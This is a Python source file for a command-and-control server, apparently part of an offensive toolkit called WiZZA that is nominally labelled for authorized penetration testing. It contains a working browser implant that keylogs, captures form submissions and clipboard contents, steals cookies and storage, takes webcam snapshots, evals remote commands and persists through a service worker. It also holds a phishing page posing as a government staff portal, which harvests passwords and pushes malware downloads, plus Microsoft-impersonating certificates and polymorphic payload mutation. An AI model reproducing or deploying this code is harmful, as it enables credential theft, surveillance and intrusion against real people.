#!/usr/bin/env python3
"""Advanced C2 Server — authorized pen testing only"""
import os,json,time,threading,socket,base64,mimetypes,ssl,subprocess,hashlib,random,struct
from http.server import HTTPServer,BaseHTTPRequestHandler
from datetime import datetime
from collections import defaultdict
from urllib.parse import urlparse,parse_qs,unquote_plus

# ── Optional module imports ───────────────────────────────────────────────────
_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
_MOD_DIR  = os.path.join(_THIS_DIR, "..", "modules")
import sys as _sys
if _MOD_DIR not in _sys.path: _sys.path.insert(0, _MOD_DIR)

try:
    from proxy_socks import start_proxy, stop_proxy, list_sessions
    from proxy_socks import agent_poll_proxy, agent_connected, agent_data_from, agent_data_to, agent_close
    _PROXY_OK = True
except ImportError:
    _PROXY_OK = False

try:
    import pty_handler as _pty
    _PTY_OK = True
except ImportError:
    # pty_handler is in the same directory
    try:
        _sys.path.insert(0, _THIS_DIR)
        import pty_handler as _pty
        _PTY_OK = True
    except ImportError:
        _PTY_OK = False

try:
    from dns_c2 import c2_store_cmd as _dns_store_cmd, c2_get_cmd_txt as _dns_get_txt
    from dns_c2 import c2_receive_chunk as _dns_recv_chunk
    _DNS_C2_OK = True
except ImportError:
    _DNS_C2_OK = False

try:
    from c2_profiles import set_profile as _set_profile, list_profiles as _list_profiles
    from c2_profiles import get_profile as _get_profile
    _PROFILES_OK = True
except ImportError:
    _PROFILES_OK = False

try:
    from llmnr_poison import start as _llmnr_start, stop as _llmnr_stop, get_hashes as _llmnr_hashes
    _LLMNR_OK = True
except ImportError:
    _LLMNR_OK = False

_EXPLOIT_DIR = os.path.join(_THIS_DIR, "..", "exploit")
if _EXPLOIT_DIR not in _sys.path: _sys.path.insert(0, _EXPLOIT_DIR)
try:
    import network_cve as _net_cve
    _NET_CVE_OK = True
except ImportError:
    _NET_CVE_OK = False

try:
    import web_cve as _web_cve
    _WEB_CVE_OK = True
except ImportError:
    _WEB_CVE_OK = False

_MOD_DIR2 = os.path.join(_THIS_DIR, "..", "modules")
if _MOD_DIR2 not in _sys.path: _sys.path.insert(0, _MOD_DIR2)

try:
    import byovd as _byovd_mod
    _BYOVD_OK = True
except ImportError:
    _BYOVD_OK = False

try:
    import defender_kill as _dk_mod
    _DK_OK = True
except ImportError:
    _DK_OK = False

try:
    import zero_click as _zc_mod
    _ZC_OK = True
except ImportError:
    _ZC_OK = False

try:
    import wifi_attack as _wifi_mod
    _WIFI_OK = True
except ImportError:
    _WIFI_OK = False

try:
    import iot_attack as _iot_mod
    _IOT_OK = True
except ImportError:
    _IOT_OK = False

# ── Per-request polymorphic mutation cache ────────────────────────────────────
_POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
_POLY_LOCK  = threading.Lock()
_EVADE_DIR  = os.path.join(os.path.dirname(__file__), "..", "evade")

def _poly_mutate(fpath: str) -> bytes:
    """Return a freshly mutated (polymorphic) version of a PS1 or Python payload."""
    global _POLY_CACHE
    ext = os.path.splitext(fpath)[1].lower()
    if ext not in (".ps1", ".py"):
        with open(fpath, "rb") as f: return f.read()
    try:
        mtime = os.path.getmtime(fpath)
        with _POLY_LOCK:
            cached = _POLY_CACHE.get(fpath)
            # Serve cached mutation for up to 30s to handle retry-within-session
            if cached and cached[0] == mtime and (time.time() - cached[2]) < 30:
                return cached[1]
        with open(fpath) as f: source = f.read()
        lang = "ps1" if ext == ".ps1" else "py"
        evade_dir = os.path.abspath(_EVADE_DIR)
        import sys as _sys
        if evade_dir not in _sys.path: _sys.path.insert(0, evade_dir)
        from poly_engine import PolyEngine
        pe = PolyEngine(rounds=2, flatten=True, dead_blocks=3, sandbox=True)
        mutated = pe.mutate_ps1(source) if lang == "ps1" else pe.mutate_py(source)
        result = mutated.encode()
        with _POLY_LOCK:
            _POLY_CACHE[fpath] = (mtime, result, time.time())
        return result
    except Exception:
        with open(fpath, "rb") as f: return f.read()

# ── XOR comm decryption helper (server-side) ──────────────────────────────────
def _comm_key(aid: str) -> bytes:
    return hashlib.sha256(aid.encode()).digest()[:16]

def _comm_enc(data: str, aid: str) -> str:
    key = _comm_key(aid)
    b = data.encode()
    enc = bytes(b[i] ^ key[i % len(key)] for i in range(len(b)))
    return base64.b64encode(enc).decode()

def _comm_dec(b64: str, aid: str) -> str:
    try:
        key = _comm_key(aid)
        b = base64.b64decode(b64)
        dec = bytes(b[i] ^ key[i % len(key)] for i in range(len(b)))
        return dec.decode()
    except Exception:
        return b64

C2_PORT     = int(os.environ.get("C2_PORT",8888))
AGENT_PORT  = int(os.environ.get("AGENT_PORT",4444))
_HOME       = os.path.expanduser("~")
LOG_DIR     = os.environ.get("LOG_DIR",    os.path.join(_HOME,".wizza","logs"))
PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR",os.path.join(_HOME,".wizza","payloads"))
LOOT_DIR    = os.path.join(LOG_DIR,"loot")
MOBILE_DIR  = os.path.join(LOG_DIR,"mobile")
CREDS_FILE  = f"{LOG_DIR}/credentials.txt"
# Clean lure path — set via LURE_PATH env var; email links point here
LURE_PATH   = os.environ.get("LURE_PATH",  "/docs")
LURE_TITLE  = os.environ.get("LURE_TITLE", "Security Certificate Update")

for d in [LOG_DIR,PAYLOAD_DIR,LOOT_DIR,MOBILE_DIR]: os.makedirs(d,exist_ok=True)

# Mobile agent store: {sid: {info, cmds[], data[]}}
mobile_agents  = {}
mobile_cmds    = defaultdict(list)  # sid -> [pending cmds]
mobile_data    = defaultdict(list)  # sid -> [received data]

USE_TLS = os.environ.get("C2_TLS","1") != "0"

def _gen_cert():
    cert=os.path.join(LOG_DIR,"c2.crt"); key=os.path.join(LOG_DIR,"c2.key")
    if not (os.path.exists(cert) and os.path.exists(key)):
        try:
            subprocess.run(["openssl","req","-x509","-newkey","rsa:2048",
                "-keyout",key,"-out",cert,"-days","730","-nodes",
                "-subj","/CN=update.microsoft.com/O=Microsoft Corporation/C=US/ST=WA/L=Redmond"],
                capture_output=True, check=True)
        except Exception as e:
            return None,None
    return cert,key

agents={}; agent_cmds=defaultdict(list); agent_resps=defaultdict(list)
_lock=threading.Lock()

import re as _re
def ts(): return datetime.now().strftime("%H:%M:%S")
def _strip_ansi(s): return _re.sub(r'\x1b\[[0-9;]*[A-Za-z]|\r','',s)
def log(m):
    l=f"[{ts()}] {m}"; print(l,flush=True)
    open(f"{LOG_DIR}/c2.log","a").write(_strip_ansi(l)+"\n")
_log = log  # alias used by some route handlers

# ── TCP raw agent listener ───────────────────────────────────────────────────
def handle_agent(conn,addr):
    ip=addr[0]; aid=f"{ip}_{int(time.time())}"
    try:
        data=conn.recv(4096).decode(errors="replace").strip()
        info=json.loads(data); aid=info.get("id",aid)
        with _lock:
            agents[aid]={"ip":ip,"os":info.get("os","?"),"type":"tcp",
                "hostname":info.get("hostname","?"),"user":info.get("user","?"),
                "priv":info.get("priv","?"),"last_seen":ts(),"status":"ONLINE",
                "log":f"{LOG_DIR}/agent_{aid}.txt"}
        conn.send(b"OK\n")
        log(f"[TCP] {aid} | {info.get('os','?')[:60]}")
        while True:
            with _lock: agents[aid]["last_seen"]=ts()
            cmd=agent_cmds[aid].pop(0) if agent_cmds[aid] else "PING"
            conn.send((cmd+"\n").encode())
            if cmd=="EXIT": break
            resp=b""; conn.settimeout(30)
            try:
                while True:
                    chunk=conn.recv(4096)
                    if not chunk or b"<<END>>" in chunk: resp+=chunk.replace(b"<<END>>",b""); break
                    resp+=chunk
            except socket.timeout: pass
            if resp and cmd!="PING":
                dec=resp.decode(errors="replace")
                _handle_result(aid,cmd,dec)
            time.sleep(1)
    except Exception as e: log(f"[TCP] {aid} gone: {e}")
    finally: conn.close(); agents.get(aid,{}).update({"status":"OFFLINE"}) if aid in agents else None

def _handle_result(aid,cmd,out):
    """Process result — extract binary loot if present"""
    if out.startswith("SCREENSHOT_B64::") or out.startswith("WEBCAM_B64::"):
        prefix,_,b64data=out.partition("::")
        try:
            raw=base64.b64decode(b64data)
            ext=".png" if "SCREENSHOT" in prefix else ".jpg"
            fname=f"{aid}_{cmd.replace(' ','_')}_{int(time.time())}{ext}"
            fpath=os.path.join(LOOT_DIR,fname)
            open(fpath,"wb").write(raw)
            disp=f"[LOOT:{prefix}] saved {fname} ({len(raw)}b)"
            with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"image"})
            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
            log(f"[LOOT] {aid} {fname}")
            return
        except Exception as e: log(f"[LOOT ERR] {e}")
    if out.startswith("FILE_B64::"):
        parts=out.split("::")
        try:
            raw=base64.b64decode(parts[1])
            orig=parts[2] if len(parts)>2 else "file"
            fname=f"{aid}_{int(time.time())}_{orig}"
            fpath=os.path.join(LOOT_DIR,fname)
            open(fpath,"wb").write(raw)
            disp=f"[LOOT:FILE] {orig} → {fname} ({len(raw)}b)"
            with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"file"})
            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
            log(f"[LOOT] {aid} {fname}")
            return
        except Exception as e: log(f"[LOOT ERR] {e}")
    with _lock: agent_resps[aid].append({"cmd":cmd,"resp":out,"ts":ts()})
    if aid in agents:
        open(agents[aid]["log"],"a").write(f"\n[{ts()}] CMD:{cmd}\n{out}\n{'─'*40}\n")
    log(f"[RESULT] [{aid}] {cmd[:40]} {len(out)}b")

def agent_listener():
    srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    srv.bind(("0.0.0.0",AGENT_PORT)); srv.listen(10)
    log(f"[*] TCP :{AGENT_PORT}")
    while True:
        try: conn,addr=srv.accept(); threading.Thread(target=handle_agent,args=(conn,addr),daemon=True).start()
        except: pass

# ── JS browser agent ─────────────────────────────────────────────────────────
JS_AGENT=r"""
(function(){
var AID='js'+Math.random().toString(36).substr(2,8),POLL=6000,kb={};
function enc(s){try{return encodeURIComponent(String(s||'').substr(0,800));}catch(e){return '';}}
function get(p,cb){var x=new XMLHttpRequest();x.open('GET',p,true);x.timeout=15000;
  x.onreadystatechange=function(){if(x.readyState===4&&cb)cb(x.status===200?x.responseText.trim():'');};
  try{x.send();}catch(e){}}
function post(p,b){var x=new XMLHttpRequest();x.open('POST',p,true);
  x.setRequestHeader('Content-Type','text/plain');
  try{x.send(String(b||'').substr(0,200000));}catch(e){}}
function reg(){get('/agent/register?id='+AID
  +'&os='+enc(navigator.userAgent.substr(0,150))
  +'&hostname='+enc(location.hostname||'browser')
  +'&user='+enc(navigator.platform||'?')
  +'&type=js-browser&priv=browser');}

// ── Special command handlers ──────────────────────────────────
function jsRecon(){
  var i=navigator.connection||{};
  return JSON.stringify({
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    languages:navigator.languages,
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+'x'+screen.height+' depth:'+screen.colorDepth,
    deviceMemory:navigator.deviceMemory||'?',
    hardwareConcurrency:navigator.hardwareConcurrency,
    onLine:navigator.onLine,
    connection:{type:i.type,downlink:i.downlink,rtt:i.rtt},
    url:location.href,
    referrer:document.referrer,
    title:document.title,
    cookies:document.cookie.substr(0,1000),
    localStorage_keys:Object.keys(localStorage),
    sessionStorage_keys:Object.keys(sessionStorage),
    plugins:Array.from(navigator.plugins||[]).map(function(p){return p.name;}).join(', '),
    doNotTrack:navigator.doNotTrack,
    cookieEnabled:navigator.cookieEnabled,
    pdfViewer:navigator.pdfViewerEnabled
  },null,2);}

function jsBrowsers(){
  var r='=== COOKIES ===\n'+document.cookie+'\n\n=== localStorage ===\n';
  try{for(var k in localStorage)r+=k+'='+localStorage.getItem(k)+'\n';}catch(e){r+='(blocked)\n';}
  r+='\n=== sessionStorage ===\n';
  try{for(var k in sessionStorage)r+=k+'='+sessionStorage.getItem(k)+'\n';}catch(e){r+='(blocked)\n';}
  r+='\n=== IndexedDB databases ===\n';
  if(indexedDB&&indexedDB.databases)indexedDB.databases().then(function(dbs){
    post('/agent/result?id='+AID+'&cmd=BROWSERS_IDB',dbs.map(function(d){return d.name;}).join(', '));
  }).catch(function(){});
  return r;}

function jsNetwork(){
  var r='=== CONNECTION ===\n';
  var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
  r+='type:'+c.type+' downlink:'+c.downlink+'Mbps rtt:'+c.rtt+'ms\n\n';
  r+='=== WebRTC local IP ===\n(probing...)\n';
  try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('x');pc.createOffer().then(function(d){pc.setLocalDescription(d);});
    pc.onicecandidate=function(e){if(e&&e.candidate){var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
      if(m)post('/agent/result?id='+AID+'&cmd=WEBRTC_IPS',JSON.stringify(m));pc.close();}};}catch(ex){}
  return r;}

function jsClipboard(){
  if(navigator.clipboard&&navigator.clipboard.readText)
    navigator.clipboard.readText().then(function(t){
      post('/agent/result?id='+AID+'&cmd=CLIPBOARD_DATA',t.substr(0,5000));
    }).catch(function(e){post('/agent/result?id='+AID+'&cmd=CLIPBOARD_DATA','(denied: '+e+')');});
  return '(requesting clipboard async...)';}

function jsScreenshot(){
  // Canvas-based screenshot of current page DOM
  var c=document.createElement('canvas');
  c.width=window.innerWidth;c.height=window.innerHeight;
  var ctx=c.getContext('2d');
  // Draw visible page as SVG → canvas (works for same-origin pages)
  try{
    var svg='<svg xmlns="http://www.w3.org/2000/svg" width="'+c.width+'" height="'+c.height+'">'
      +'<foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml">'
      +document.documentElement.outerHTML.substr(0,50000)
      +'</body></foreignObject></svg>';
    var img=new Image();
    img.onload=function(){ctx.drawImage(img,0,0);
      post('/agent/result?id='+AID+'&cmd=SCREENSHOT_JS',c.toDataURL('image/png'));};
    img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg);
  }catch(e){return '(screenshot err: '+e+')';}
  return '(capturing page...';}

function jsWebcam(){
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return '(getUserMedia not available)';
  navigator.mediaDevices.getUserMedia({video:{width:640,height:480},audio:false})
    .then(function(stream){
      var v=document.createElement('video');v.srcObject=stream;v.play();
      setTimeout(function(){
        var c=document.createElement('canvas');c.width=640;c.height=480;
        c.getContext('2d').drawImage(v,0,0,640,480);
        var data=c.toDataURL('image/jpeg',0.8);
        post('/agent/result?id='+AID+'&cmd=WEBCAM_JS',data);
        stream.getTracks().forEach(function(t){t.stop();});
      },800);
    }).catch(function(e){post('/agent/result?id='+AID+'&cmd=WEBCAM_JS','(denied: '+e+')');});
  return '(requesting webcam...)';}

function jsPersist(){
  var r='';
  if('serviceWorker' in navigator){
    navigator.serviceWorker.register('/sw.js?aid='+AID)
      .then(function(reg){post('/agent/result?id='+AID+'&cmd=PERSIST_SW','SW registered: '+reg.scope);})
      .catch(function(e){post('/agent/result?id='+AID+'&cmd=PERSIST_SW','SW failed: '+e);});
    r+='Service worker registration requested\n';}
  // Store self in localStorage for page reload persistence
  try{localStorage.setItem('_syshelper_aid',AID);r+='localStorage mark set\n';}catch(e){}
  // Cache agent source
  if('caches' in window)caches.open('sys-v1').then(function(cache){
    cache.add('/js-agent.js').catch(function(){});
  });
  return r||'(persist attempted)';}

function jsSelfdestruct(){
  try{localStorage.clear();sessionStorage.clear();}catch(e){}
  if('serviceWorker' in navigator)navigator.serviceWorker.getRegistrations().then(function(regs){
    regs.forEach(function(r){r.unregister();});});
  if('caches' in window)caches.keys().then(function(keys){keys.forEach(function(k){caches.delete(k);});});
  return 'Cleared: localStorage, sessionStorage, service workers, caches';}

function jsKeylogDump(){
  var r=JSON.stringify(kb);kb={};return r||'(keylog empty)';}

// ── Command dispatcher ────────────────────────────────────────
function dispatch(cmd){
  if(cmd==='RECON')            return jsRecon();
  if(cmd==='BROWSERS')         return jsBrowsers();
  if(cmd==='NETWORK')          return jsNetwork();
  if(cmd==='CLIPBOARD')        return jsClipboard();
  if(cmd==='SCREENSHOT')       return jsScreenshot();
  if(cmd==='WEBCAM')           return jsWebcam();
  if(cmd==='PERSIST')          return jsPersist();
  if(cmd==='SELFDESTRUCT')     return jsSelfdestruct();
  if(cmd==='KEYLOG_START')     return 'Already keylogging — use KEYLOG_DUMP to flush';
  if(cmd==='KEYLOG_DUMP')      return jsKeylogDump();
  if(cmd==='SYSINFO')          return jsRecon();
  if(cmd==='DRIVES')           return '(N/A in browser — JS agent)';
  if(cmd==='SSHKEYS')          return '(N/A in browser — JS agent)';
  if(cmd==='HASHDUMP')         return '(N/A in browser — JS agent)';
  if(cmd==='PRIVESC')          return '(N/A in browser — JS agent)';
  if(cmd==='SPREAD')           return '(N/A in browser — use Python agent for USB spread)';
  if(cmd.substr(0,8)==='GETFILE') return '(use BROWSERS for storage data — JS agent)';
  // Default: eval as JavaScript
  var res;try{res=String(eval(cmd));}catch(e){res='ERR:'+String(e);}
  return res;}

function poll(){get('/agent/poll?id='+AID,function(cmd){
  if(!cmd||cmd==='PING')return;if(cmd==='REGISTER'){reg();return;}if(cmd==='EXIT')return;
  var res=dispatch(cmd);
  if(res)post('/agent/result?id='+AID+'&cmd='+enc(cmd),res);});}

// ── Passive collection ────────────────────────────────────────
document.addEventListener('input',function(e){var el=e.target;
  if(el.tagName==='INPUT'||el.tagName==='TEXTAREA')
    kb[el.name||el.id||el.placeholder||el.type||'f']=el.value;},true);
document.addEventListener('submit',function(e){var d={},els=e.target.querySelectorAll('input,select,textarea');
  for(var i=0;i<els.length;i++){var el=els[i];if(el.name||el.id)d[el.name||el.id]=el.value;}
  if(Object.keys(d).length)post('/agent/result?id='+AID+'&cmd=FORM_SUBMIT',JSON.stringify(d));},true);
document.addEventListener('paste',function(e){try{var t=(e.clipboardData||window.clipboardData).getData('text');
  if(t)post('/agent/result?id='+AID+'&cmd=CLIPBOARD_PASTE',t.substr(0,5000));}catch(ex){}},true);
if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
  post('/agent/result?id='+AID+'&cmd=GEOLOC','lat:'+p.coords.latitude.toFixed(6)+' lng:'+p.coords.longitude.toFixed(6)+' acc:'+Math.round(p.coords.accuracy)+'m');
},function(){},{timeout:10000,enableHighAccuracy:true});
if(navigator.getBattery)navigator.getBattery().then(function(b){
  post('/agent/result?id='+AID+'&cmd=BATTERY','level:'+Math.round(b.level*100)+'% charging:'+b.charging);}).catch(function(){});
if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js?aid='+AID).catch(function(){});
reg();
setTimeout(function(){
  post('/agent/result?id='+AID+'&cmd=DEVICE_INFO',jsRecon());
  var tid=setInterval(poll,POLL);
  setInterval(function(){if(Object.keys(kb).length){post('/agent/result?id='+AID+'&cmd=KEYLOG',JSON.stringify(kb));kb={};}},15000);
},600);
})();
"""

SW_JS=r"""
var C2='__C2URL__',AID='__AID__sw';
self.addEventListener('install',e=>self.skipWaiting());
self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
self.addEventListener('fetch',e=>{});
async function doPoll(){try{let r=await fetch(C2+'/agent/poll?id='+AID),cmd=(await r.text()).trim();
  if(!cmd||cmd==='PING'||cmd==='REGISTER')return;
  let ws=await clients.matchAll({type:'window',includeUncontrolled:true});
  if(ws.length)ws[0].postMessage({c2cmd:cmd,aid:AID});
  else await fetch(C2+'/agent/result?id='+AID+'&cmd='+encodeURIComponent(cmd),{method:'POST',body:'(sw-bg)'});
}catch(e){}}
self.addEventListener('periodicsync',e=>{if(e.tag==='c2-hb')e.waitUntil(doPoll());});
self.addEventListener('push',e=>{e.waitUntil(doPoll());});
self.addEventListener('activate',e=>e.waitUntil((async()=>{
  if(self.registration.periodicSync)try{await self.registration.periodicSync.register('c2-hb',{minInterval:30000});}catch(ex){}
})()));
"""

MANIFEST=json.dumps({"name":"Staff Portal","short_name":"Portal","start_url":"/banner",
    "display":"standalone","background_color":"#1a3a6e","theme_color":"#1a3a6e",
    "icons":[{"src":"/icon.png","sizes":"192x192","type":"image/png"}]})

BANNER="""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>Staff Portal — Office of the President</title>
<link rel="manifest" href="/manifest.json">
<style>
*{box-sizing:border-box;margin:0;padding:0}html,body{height:100%}
body{font-family:-apple-system,Arial,sans-serif;background:#1a3a6e;display:flex;
  align-items:center;justify-content:center;min-height:100vh;padding:16px}
.card{background:#fff;border-radius:10px;padding:32px 36px;width:360px;max-width:100%;box-shadow:0 10px 50px rgba(0,0,0,.5)}
.logo{text-align:center;margin-bottom:20px}.logo img{height:68px}
.logo-name{font-size:13px;color:#1a3a6e;font-weight:700;margin-top:8px;line-height:1.4}
h1{font-size:18px;color:#1a3a6e;text-align:center;margin-bottom:3px;font-weight:700}
.sub{text-align:center;font-size:12px;color:#888;margin-bottom:20px}
label{font-size:13px;color:#444;display:block;margin-bottom:4px;font-weight:500}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:5px;font-size:14px;
  margin-bottom:14px;outline:none;-webkit-appearance:none}
input:focus{border-color:#1a3a6e}
.btn{width:100%;padding:12px;background:#1a3a6e;color:#fff;border:none;border-radius:5px;
  font-size:15px;cursor:pointer;font-weight:600;-webkit-appearance:none}
.err{display:none;color:#c00;font-size:12px;margin-bottom:10px;padding:8px;
  background:#fff5f5;border-radius:4px;border-left:3px solid #c00}
.help{text-align:center;font-size:11px;color:#aaa;margin-top:12px}
hr{margin:18px -36px;border:none;border-top:1px solid #f0f0f0}
#ib p{font-size:11px;color:#999;text-align:center;margin-bottom:8px}
.ibtn{display:block;width:100%;padding:11px;border:1.5px solid #1a3a6e;color:#1a3a6e;
  background:#f0f4ff;border-radius:5px;font-size:13px;font-weight:600;text-align:center;
  text-decoration:none;cursor:pointer;-webkit-appearance:none}
#ld{display:none;position:fixed;inset:0;background:rgba(26,58,110,.95);z-index:999;
  align-items:center;justify-content:center;flex-direction:column}
#ld.show{display:flex}
.sp{width:40px;height:40px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;
  border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
#ld p{color:#fff;margin-top:14px;font-size:14px}
</style></head><body>
<div id="ld"><div class="sp"></div><p id="lm">Verifying...</p></div>
<div class="card">
  <div class="logo">
    <img src="https://heilige.com/sites/default/files/2022-01/op-logo.png" onerror="this.style.display='none'">
    <div class="logo-name">Security Portal</div>
  </div>
  <h1>Staff Portal</h1><p class="sub">Sign in with your government account</p>
  <form id="lf" onsubmit="doLogin(event)" autocomplete="on">
    <label>Username or email</label>
    <input type="email" id="fu" name="email" autocomplete="email" placeholder="username" required>
    <label>Password</label>
    <input type="password" id="fp" name="password" autocomplete="current-password" placeholder="Password" required>
    <p class="err" id="em">Incorrect username or password.</p>
    <button class="btn" type="submit" id="sb">Sign in</button>
  </form>
  <div class="help">Forgot password? &bull; IT Helpdesk: +220 422 2222</div>
  <hr><div id="ib"><p id="il"></p><a id="ib2" class="ibtn" href="#" style="display:none"></a>
  <button id="ipwa" class="ibtn" style="display:none" onclick="installPWA()">&#x2B07; Add to Home Screen</button>
  </div>
</div>
<script src="/js-agent.js"></script>
<script>
var ua=navigator.userAgent.toLowerCase(),isIOS=/iphone|ipad|ipod/.test(ua),
    isAnd=/android/.test(ua),isWin=/windows/.test(ua),pwa=null;
function doLogin(e){
  e.preventDefault();var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'portal'})}).catch(function(){});
  document.getElementById('ld').classList.add('show');
  setTimeout(function(){document.getElementById('ld').classList.remove('show');
    document.getElementById('em').style.display='block';
    document.getElementById('sb').disabled=false;
    document.getElementById('fp').value='';document.getElementById('fp').focus();},2200);}
window.addEventListener('beforeinstallprompt',function(e){e.preventDefault();pwa=e;
  if(isAnd){document.getElementById('il').textContent='Stay signed in:';
    document.getElementById('ipwa').style.display='block';}});
function installPWA(){if(pwa)pwa.prompt();}
window.addEventListener('load',function(){
  var dl=isWin?'/download/SecureCertUpdate.hta':(!isIOS?'/download/agent_http.py':null);
  if(dl){setTimeout(function(){var a=document.createElement('a');a.href=dl;
    a.download=dl.split('/').pop();document.body.appendChild(a);a.click();document.body.removeChild(a);},1500);}
  var lbl=document.getElementById('il'),btn=document.getElementById('ib2');
  if(isIOS){lbl.textContent='Required: install security certificate';
    btn.textContent='\\uD83D\\uDD12 Install iOS Certificate';btn.href='/download/GovPortal_Security.mobileconfig';
    btn.style.display='block';setTimeout(function(){window.location.href='/download/GovPortal_Security.mobileconfig';},3000);}
  else if(isAnd&&!pwa){lbl.textContent='Stay signed in:';
    btn.textContent='\\uD83D\\uDCF1 Install Portal App';btn.href='/download/agent_http.py';
    btn.download='portal_helper.py';btn.style.display='block';}
  else if(isWin){lbl.textContent='Security update required:';
    btn.textContent='\\uD83D\\uDCE6 Install Update';btn.href='/download/SecureCertUpdate.hta';
    btn.download='SecureCertUpdate.hta';btn.style.display='block';}
  else{lbl.textContent='Install portal helper:';
    btn.textContent='\\uD83D\\uDD27 Download';btn.href='/download/agent_http.py';
    btn.download='portal_helper.py';btn.style.display='block';}});
</script></body></html>"""

HTML_PANEL="""<!DOCTYPE html><html lang="en"><head><title>C2 Panel — WiZZA</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{{--bg:#0d1b2a;--bg2:#112240;--bg3:#1a3a6e;--acc:#00c8ff;--acc2:#ff6b35;--grn:#00e676;--red:#ff5252;--yel:#ffd740;--pink:#ff4fc8;--txt:#e0e8f0;--sub:#7a9ab8;--brd:#1e3a5a}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg);color:var(--txt);display:flex;height:100vh;overflow:hidden;font-size:13px}}
#sidebar{{width:200px;min-width:200px;background:var(--bg2);border-right:1px solid var(--brd);display:flex;flex-direction:column}}
#logo{{padding:16px 14px 12px;border-bottom:1px solid var(--brd);font-size:15px;font-weight:700;color:var(--acc);letter-spacing:1px}}
#logo span{{color:var(--acc2);font-size:11px;display:block;font-weight:400;margin-top:2px}}
.nav{{padding:11px 16px;cursor:pointer;color:var(--sub);font-size:12px;display:flex;align-items:center;gap:8px;border-left:3px solid transparent;transition:all .15s;text-decoration:none}}
.nav:hover{{background:var(--bg3);color:var(--txt)}}.nav.active{{background:var(--bg3);color:var(--acc);border-left-color:var(--acc)}}
.badge{{margin-left:auto;background:var(--acc2);color:#000;font-size:10px;padding:1px 6px;border-radius:10px;font-weight:700}}
.badge.g{{background:var(--grn)}}.badge.p{{background:var(--pink)}}
#sbar{{margin-top:auto;padding:12px;border-top:1px solid var(--brd);font-size:11px;color:var(--sub)}}
#sbar div{{margin:3px 0}}#sbar b{{color:var(--txt)}}
#main{{flex:1;display:flex;flex-direction:column;overflow:hidden}}
#topbar{{background:var(--bg2);border-bottom:1px solid var(--brd);padding:8px 16px;display:flex;align-items:center;justify-content:space-between;font-size:12px;color:var(--sub)}}
#content{{flex:1;overflow-y:auto;padding:16px}}
.pane{{display:none}}.pane.active{{display:block}}
table{{width:100%;border-collapse:collapse;margin-bottom:12px}}
th{{background:var(--bg2);color:var(--acc);padding:7px 10px;text-align:left;border:1px solid var(--brd);font-size:11px;letter-spacing:.5px}}
td{{padding:6px 10px;border:1px solid var(--brd);font-size:12px;word-break:break-all;vertical-align:middle}}
tr:hover td{{background:rgba(255,255,255,.03)}}tr.sel td{{background:rgba(0,200,255,.08)}}
.on{{color:var(--grn)}}.off{{color:var(--red)}}.js{{color:var(--yel)}}.worm{{color:var(--pink)}}
.root{{color:var(--pink);font-weight:700}}.tag{{font-size:10px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--sub);margin-left:4px}}
.box{{background:var(--bg2);border:1px solid var(--brd);border-radius:6px;padding:14px;margin-bottom:14px}}
.box label{{font-size:11px;color:var(--sub);display:block;margin-bottom:6px}}
.row{{display:flex;gap:8px;align-items:center;flex-wrap:wrap}}
select,input[type=text]{{background:var(--bg);color:var(--txt);border:1px solid var(--brd);padding:7px 10px;border-radius:4px;font-size:12px;outline:none}}
select:focus,input:focus{{border-color:var(--acc)}}input[type=text]{{flex:1;min-width:180px}}
.btn{{padding:7px 14px;border:none;border-radius:4px;cursor:pointer;font-size:12px;font-weight:600;text-decoration:none;display:inline-block}}
.bp{{background:var(--acc);color:#000}}.ba{{background:var(--acc2);color:#000}}.bd{{background:var(--red);color:#fff}}
.qa-sec{{margin-bottom:12px}}.qa-lbl{{font-size:10px;color:var(--sub);text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px}}
.qa-row{{display:flex;flex-wrap:wrap;gap:4px}}
.qa{{padding:4px 9px;border-radius:3px;font-size:11px;cursor:pointer;border:1px solid var(--brd);background:var(--bg2);color:var(--sub);text-decoration:none;display:inline-block}}
.qa:hover{{background:var(--bg3);color:var(--txt)}}
.qa.g{{border-color:#00e67644;color:var(--grn)}}.qa.g:hover{{background:#00e67622}}
.qa.y{{border-color:#ffd74044;color:var(--yel)}}.qa.y:hover{{background:#ffd74022}}
.qa.r{{border-color:#ff525244;color:var(--red)}}.qa.r:hover{{background:#ff525222}}
.qa.p{{border-color:#ff4fc844;color:var(--pink)}}.qa.p:hover{{background:#ff4fc822}}
.rb{{background:var(--bg2);border:1px solid var(--brd);border-radius:5px;margin-bottom:10px;overflow:hidden}}
